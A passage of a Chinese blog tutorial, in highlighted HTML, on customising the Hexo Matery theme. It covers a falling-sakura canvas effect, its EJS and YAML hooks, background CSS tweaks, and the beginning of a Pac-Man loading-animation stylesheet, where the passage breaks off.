    staticx <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    canvas<span class="token punctuation">.</span>height <span class="token operator">=</span> window<span class="token punctuation">.</span>innerHeight<span class="token punctuation">;</span>
    canvas<span class="token punctuation">.</span>width <span class="token operator">=</span> window<span class="token punctuation">.</span>innerWidth<span class="token punctuation">;</span>
    canvas<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">,</span> <span class="token string">'position: fixed;left: 0;top: 0;pointer-events: none;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    canvas<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">,</span> <span class="token string">'canvas_sakura'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'body'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>canvas<span class="token punctuation">)</span><span class="token punctuation">;</span>
    cxt <span class="token operator">=</span> canvas<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">'2d'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> sakuraList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SakuraList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">50</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">var</span> sakura<span class="token punctuation">,</span> randomX<span class="token punctuation">,</span> randomY<span class="token punctuation">,</span> randomS<span class="token punctuation">,</span> randomR<span class="token punctuation">,</span> randomFnx<span class="token punctuation">,</span> randomFny<span class="token punctuation">;</span>
        randomX <span class="token operator">=</span> <span class="token function">getRandom</span><span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        randomY <span class="token operator">=</span> <span class="token function">getRandom</span><span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        randomR <span class="token operator">=</span> <span class="token function">getRandom</span><span class="token punctuation">(</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        randomS <span class="token operator">=</span> <span class="token function">getRandom</span><span class="token punctuation">(</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        randomFnx <span class="token operator">=</span> <span class="token function">getRandom</span><span class="token punctuation">(</span><span class="token string">'fnx'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        randomFny <span class="token operator">=</span> <span class="token function">getRandom</span><span class="token punctuation">(</span><span class="token string">'fny'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        randomFnR <span class="token operator">=</span> <span class="token function">getRandom</span><span class="token punctuation">(</span><span class="token string">'fnr'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        sakura <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sakura</span><span class="token punctuation">(</span>randomX<span class="token punctuation">,</span> randomY<span class="token punctuation">,</span> randomS<span class="token punctuation">,</span> randomR<span class="token punctuation">,</span> <span class="token punctuation">{</span>
            x<span class="token punctuation">:</span> randomFnx<span class="token punctuation">,</span>
            y<span class="token punctuation">:</span> randomFny<span class="token punctuation">,</span>
            r<span class="token punctuation">:</span> randomFnR
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        sakura<span class="token punctuation">.</span><span class="token function">draw</span><span class="token punctuation">(</span>cxt<span class="token punctuation">)</span><span class="token punctuation">;</span>
        sakuraList<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>sakura<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    stop <span class="token operator">=</span> <span class="token function">requestAnimationFrame</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        cxt<span class="token punctuation">.</span><span class="token function">clearRect</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> canvas<span class="token punctuation">.</span>width<span class="token punctuation">,</span> canvas<span class="token punctuation">.</span>height<span class="token punctuation">)</span><span class="token punctuation">;</span>
        sakuraList<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        sakuraList<span class="token punctuation">.</span><span class="token function">draw</span><span class="token punctuation">(</span>cxt<span class="token punctuation">)</span><span class="token punctuation">;</span>
        stop <span class="token operator">=</span> <span class="token function">requestAnimationFrame</span><span class="token punctuation">(</span>arguments<span class="token punctuation">.</span>callee<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
window<span class="token punctuation">.</span>onresize <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> canvasSnow <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'canvas_snow'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
img<span class="token punctuation">.</span>onload <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">startSakura</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">stopp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>staticx<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">var</span> child <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"canvas_sakura"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        child<span class="token punctuation">.</span>parentNode<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>child<span class="token punctuation">)</span><span class="token punctuation">;</span>
        window<span class="token punctuation">.</span><span class="token function">cancelAnimationFrame</span><span class="token punctuation">(</span>stop<span class="token punctuation">)</span><span class="token punctuation">;</span>
        staticx <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token function">startSakura</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后在 /themes/matery/layout/_partial/layout.ejs 中添加如下代码：</p>
<pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>theme<span class="token punctuation">.</span>sakura<span class="token punctuation">.</span>enable<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">%</span><span class="token operator">></span>
    <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>
    <span class="token comment" spellcheck="true">//只在桌面版网页启用特效</span>
    <span class="token keyword">var</span> windowWidth <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span>window<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">width</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>windowWidth <span class="token operator">></span> <span class="token number">768</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'&lt;script type="text/javascript" src="/js/sakura.js">&lt;/script>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token punctuation">}</span> <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在matery主题配置文件_config .yml中配置:</p>
<pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token comment" spellcheck="true"># 页面樱花飘落动效</span>
<span class="token key atrule">sakura</span><span class="token punctuation">:</span>
  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="关闭首页颜色变换"><a href="#关闭首页颜色变换" class="headerlink" title="关闭首页颜色变换"></a>关闭首页颜色变换</h3><p>进入主题文件的 <code>/source/css/matery.css</code>文件中，搜索 <code>rainbow</code>来关闭颜色变换：</p>
<pre class="line-numbers language-css"><code class="language-css"><span class="token atrule"><span class="token rule">@-webkit-keyframes</span> rainbow</span> <span class="token punctuation">{</span>
   <span class="token comment" spellcheck="true">/* 动态切换背景颜色.即滤镜颜色，不想要可以全部注释，或者换成你喜欢的颜色 */</span>
<span class="token punctuation">}</span>

<span class="token atrule"><span class="token rule">@keyframes</span> rainbow</span> <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">/* 动态切换背景颜色.，不想要可以全部注释，或者换成你喜欢的颜色 */</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="给卡片区添加背景"><a href="#给卡片区添加背景" class="headerlink" title="给卡片区添加背景"></a>给卡片区添加背景</h3><p>进入主题文件的 <code>/source/css/matery.css</code>文件中，有个 <code>body</code> 选择器，加了中间两行之后长这样：</p>
<pre class="line-numbers language-css"><code class="language-css"><span class="token selector">body </span><span class="token punctuation">{</span>
 <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token hexcode">#eaeaea</span><span class="token punctuation">;</span>

  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token function">linear-gradient</span><span class="token punctuation">(</span><span class="token number">60</span>deg, <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">224</span>,<span class="token number">255</span>,<span class="token number">125</span>, <span class="token number">0.5</span><span class="token punctuation">)</span> <span class="token number">5%</span>, <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">0</span>, <span class="token number">228</span>, <span class="token number">255</span>, <span class="token number">0.35</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token number">0%</span> <span class="token number">0%</span> / cover；<span class="token property">background-attachment</span><span class="token punctuation">:</span> fixed<span class="token punctuation">;</span>
  <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>

  <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#34495e</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>也可以加 <code>url</code> 用图片做背景：</p>
<pre class="line-numbers language-css"><code class="language-css"><span class="token selector">body </span><span class="token punctuation">{</span>
 <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token hexcode">#eaeaea</span><span class="token punctuation">;</span>

  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url">url('你的图片地址')</span>；
  <span class="token property">background-attachment</span><span class="token punctuation">:</span> fixed<span class="token punctuation">;</span>
  <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>

  <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#34495e</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Matery-添加加载动画"><a href="#Matery-添加加载动画" class="headerlink" title="Matery 添加加载动画"></a>Matery 添加加载动画</h3><h5 id="1、在主题-layout-partial-目录新建一个loading-pages-ejs-内容如下："><a href="#1、在主题-layout-partial-目录新建一个loading-pages-ejs-内容如下：" class="headerlink" title="1、在主题 /layout/_partial/目录新建一个loading-pages.ejs 内容如下："></a>1、在主题 /layout/_partial/<code>目录新建一个</code>loading-pages.ejs 内容如下：</h5><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token style language-css">
    <span class="token selector"><span class="token id">#loading-container</span></span><span class="token punctuation">{</span>
        <span class="token property">position</span><span class="token punctuation">:</span> fixed<span class="token punctuation">;</span>
        <span class="token property">top</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token property">min-height</span><span class="token punctuation">:</span> <span class="token number">100</span>vh<span class="token punctuation">;</span>
        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100</span>vw<span class="token punctuation">;</span>
        <span class="token property">z-index</span><span class="token punctuation">:</span> <span class="token number">9999</span><span class="token punctuation">;</span>
        <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>
        <span class="token property">flex-direction</span><span class="token punctuation">:</span> column<span class="token punctuation">;</span>
        <span class="token property">justify-content</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>
        <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>
        <span class="token property">background</span><span class="token punctuation">:</span> <span class="token hexcode">#FFF</span><span class="token punctuation">;</span>
        <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">/* loader页面消失采用渐隐的方式*/</span>
        <span class="token property">-webkit-transition</span><span class="token punctuation">:</span> opacity <span class="token number">1</span>s ease<span class="token punctuation">;</span>
        <span class="token property">-moz-transition</span><span class="token punctuation">:</span> opacity <span class="token number">1</span>s ease<span class="token punctuation">;</span>
        <span class="token property">-o-transition</span><span class="token punctuation">:</span> opacity <span class="token number">1</span>s ease<span class="token punctuation">;</span>
        <span class="token property">transition</span><span class="token punctuation">:</span> opacity <span class="token number">1</span>s ease<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token selector"><span class="token class">.loading-image</span></span><span class="token punctuation">{</span>
        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">120</span>px<span class="token punctuation">;</span>
        <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">50</span>px<span class="token punctuation">;</span>
        <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">translate</span><span class="token punctuation">(</span>-<span class="token number">50%</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token selector"><span class="token class">.loading-image</span> div<span class="token pseudo-class">:nth-child(2)</span> </span><span class="token punctuation">{</span>
        <span class="token property">-webkit-animation</span><span class="token punctuation">:</span> pacman-balls <span class="token number">1</span>s linear <span class="token number">0</span>s infinite<span class="token punctuation">;</span>
        <span class="token property">animation</span><span class="token punctuation">:</span> pacman-balls <span class="token number">1</span>s linear <span class="token number">0</span>s infinite
    <span class="token punctuation">}</span>

    <span class="token selector"><span class="token class">.loading-image</span> div<span class="token pseudo-class">:nth-child(3)</span> </span><span class="token punctuation">{</span>
        <span class="token property">-webkit-animation</span><span class="token punctuation">:</span> pacman-balls <span class="token number">1</span>s linear <span class="token number">.33</span>s infinite<span class="token punctuation">;</span>
        <span class="token property">animation</span><span class="token punctuation">:</span> pacman-balls <span class="token number">1</span>s linear <span class="token number">.33</span>s infinite
    <span class="token punctuation">}</span>

    <span class="token selector"><span class="token class">.loading-image</span> div<span class="token pseudo-class">:nth-child(4)</span> </span><span class="token punctuation">{</span>
        <span class="token property">-webkit-animation</span><span class="token punctuation">:</span> pacman-balls <span class="token number">1</span>s linear <span class="token number">.66</span>s infinite<span class="token punctuation">;</span>
        <span class="token property">animation</span><span class="token punctuation">:</span> pacman-balls <span class="token number">1</span>s linear <span class="token number">.66</span>s infinite
    <span class="token punctuation">}</span>

    <span class="token selector"><span class="token class">.loading-image</span> div<span class="token pseudo-class">:nth-child(5)</span> </span><span class="token punctuation">{</span>
        <span class="token property">-webkit-animation</span><span class="token punctuation">:</span> pacman-balls <span class="token number">1</span>s linear <span class="token number">.99</span>s infinite<span class="token punctuation">;</span>
        <span class="token property">animation</span><span class="token punctuation">:</span> pacman-balls <span class="token number">1</span>s linear <span class="token number">.99</span>s infinite
    <span class="token punctuation">}</span>

   <span class="token selector"><span class="token class">.loading-image</span> div<span class="token pseudo-class">:first-of-type</span> </span><span class="token punctuation">{</span>
        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">25</span>px solid <span class="token hexcode">#49b1f5</span><span class="token punctuation">;</span>
        <span class="token property">border-right-color</span><span class="token punctuation">:</span> transparent<span class="token punctuation">;</span>
        <span class="token property">border-radius</span><span class="token punctuation">:</span> <span class="token number">25</span>px<span class="token punctuation">;</span>
        <span class="token property">-webkit-animation</span><span class="token punctuation">:</span> rotate_pacman_half_up <span class="token number">.5</span>s <span class="token number">0</span>s infinite<span class="token punctuation">;</span>
        <span class="token property">animation</span><span class="token punctuation">:</span> rotate_pacman_half_up <span class="token number">.5</span>s <span class="token number">0</span>s infinite<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token selector"><span class="token class">.loading-image</span> div<span class="token pseudo-class">:nth-child(2)</span> </span><span class="token punctuation">{</span>
        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">25</span>px solid <span class="token hexcode">#49b1f5</span><span class="token punctuation">;</span>
        <span class="token property">border-right-color</span><span class="token punctuation">:</span> transparent<span class="token punctuation">;</span>
        <span class="token property">border-radius</span><span class="token punctuation">:</span> <span class="token number">25</span>px<span class="token punctuation">;</span>
        <span class="token property">-webkit-animation</span><span class="token punctuation">:</span> rotate_pacman_half_down <span class="token number">.5</span>s <span class="token number">0</span>s infinite<span class="token punctuation">;</span>
        <span class="token property">animation</span><span class="token punctuation">:</span> rotate_pacman_half_down <span class="token number">.5</span>s <span class="token number">0</span>s infinite<span class="token punctuation">;</span>
        <span class="token property">margin-top</span><span class="token punctuation">:</span> -<span class="token number">50</span>px<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token atrule"><span class="token rule">@-webkit-keyframes</span> rotate_pacman_half_up</span> <span class="token punctuation">{</span><span class="token selector">0% </span><span class="token punctuation">{</span><span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span><span class="token number">270</span>deg<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token selector">50% </span><span class="token punctuation">{</span><span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span><span class="token number">1</span>turn<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token selector">to </span><span class="token punctuation">{</span><span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span><span class="token number">270</span>deg<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>

    <span class="token atrule"><span class="token rule">@keyframes</span> rotate_pacman_half_up</span> <span class="token punctuation">{</span><span class="token selector">0% </span><span class="token punctuation">{</span><span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span><span class="token number">270</span>deg<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token selector">50% </span><span class="token punctuation">{</span><span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span><span class="token number">1</span>turn<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token selector">to </span><span class="token punctuation">{</span><span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span><span class="token number">270</span>deg<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>

    <span class="token atrule"><span class="token rule">@-webkit-keyframes</span> rotate_pacman_half_down</span> <span class="token punctuation">{</span><span class="token selector">0% </span><span class="token punctuation">{</span><span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span><span class="token number">90</span>deg<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token selector">50% </span><span class="token punctuation">{</span><span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span><span class="token number">0</span>deg<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token selector">to </span><span class="token punctuation">{</span><span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span><span class="token number">90</span>deg<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>

    <span class="token atrule"><span class="token rule">@keyframes</span> rotate_pacman_half_down</span> <span class="token punctuation">{</span><span class="token selector">0% </span><span class="token punctuation">{</span><span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span><span class="token number">90</span>deg<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token selector">50% </span><span class="token punctuation">{</span><span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span><span class="token number">0</span>deg<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token selector">to </span><span class="token punctuation">{</span><span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span><span class="token number">90</span>deg<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>

    <span class="token atrule"><span class="token rule">@-webkit-keyframes</span> pacman-balls</span> <span class="token punctuation">{</span><span class="token selector">75% </span><span class="token punctuation">{</span><span class="token property">opacity</span><span class="token punctuation">:</span> <span class="token number">.7</span><span class="token punctuation">}</span><span class="token selector">to </span><span class="token punctuation">{</span><span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">translate</span><span class="token punctuation">(</span>-<span class="token number">100</span>px, -<span class="token number">6.25</span>px<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>

    <span class="token atrule"><span class="token rule">@keyframes</span> pacman-balls</span> <span class="token punctuation">{</span><span class="token selector">75% </span><span class="token punctuation">{</span><span class="token property">opacity</span><span class="token punctuation">:</span> <span class="token number">.7</span><span class="token punctuation">}</span><span class="token selector">to </span><span class="token punctuation">{</span><span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">translate</span><span class="token punctuation">(</span>-<span class="token number">100</span>px, -<span class="token number">6.25</span>px<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>


    <span class="token selector"><span class="token class">.loading-image</span> div<span class="token pseudo-class">:nth-child(3)</span>,
    <span class="token class">.loading-image</span> div<span class="token pseudo-class">:nth-child(4)</span>,
    <span class="token class">.loading-image</span> div<span class="token pseudo-class">:nth-child(5)</span>,
    <span class="token class">.loading-image</span> div<span class="token pseudo-class">:nth-child(6)</span></span><span class="token punctuation">{</span>
        <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token hexcode">#49b1f5</span><span class="token punctuation">;</span>
        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">15</span>px<span class="token punctuation">;</span>
        <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">15</span>px<span class="token punctuation">;</span>
        <span class="token property">border-radius</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>
        <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">2</span>px<span class="token punctuation">;</span>
        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">10</span>px<span class="token punctuation">;</span>
        <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">10</span>px<span class="token punctuation">;</span>
        <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>
        <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">translateY</span><span class="token punctuation">(</span>-<span class="token number">6.25</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token property">top</span><span class="token punctuation">:</span> <span class="token number">25</span>px<span class="token punctuation">;</span>
        <span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">100</span>px<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token selector"><span class="token class">.loading-text</span></span><span class="token punctuation">{</span>
        <span class="token property">margin-bottom</span><span class="token punctuation">:</span> <span class="token number">20</span>vh<span class="token punctuation">;</span>
        <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>
        <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#2c3e50</span><span class="token punctuation">;</span>
        <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">2</span>rem<span class="token punctuation">;</span>
        <span class="token property">box-sizing</span><span class="token punctuation">:</span> border-box<span class="token punctuation">;</span>
        <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token number">0</span> <span class="token number">10</span>px<span class="token punctuation">;</span>
        <span class="token property">text-shadow</span><span class="token punctuation">:</span> <span class="token number">0</span> <span class="token number">2</span>px <span class="token number">10</span>px <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">0</span>,<span class="token number">0</span>,<span class="token number">0</span>,<span class="token number">0.2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token atrule"><span class="token rule">@media</span> only screen and <span class="token punctuation">(</span><span class="token property">max-width</span><span class="token punctuation">:</span> 500px<span class="token punctuation">)</span></span> <span class="token punctuation">{</span>
         <span class="token selector"><span class="token class">.loading-text</span></span><span class="token punctuation">{</span>
            <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">1.5</span>rem<span class="token punctuation">;</span>
         <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token selector"><span class="token class">.fadeout</span> </span><span class="token punctuation">{</span>
        <span class="token property">opacity</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token property">filter</span><span class="token punctuation">:</span> <span class="token function">alpha</span><span class="token punctuation">(</span>opacity=<span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">/* logo出现动画 */</span>
    <span class="token atrule"><span class="token rule">@-webkit-keyframes</span> fadeInDown</span><span class="token punctuation">{</span><span class="token selector">0%</span><span class="token punctuation">{</span><span class="token property">opacity</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token property">-webkit-transform</span><span class="token punctuation">:</span>translate<span class="token number">3</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token number">0</span>,-<span class="token number">100%</span>,<span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token property">transform</span><span class="token punctuation">:</span>translate<span class="token number">3</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token number">0</span>,-<span class="token number">100%</span>,<span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token selector">100%</span><span class="token punctuation">{</span><span class="token property">opacity</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token 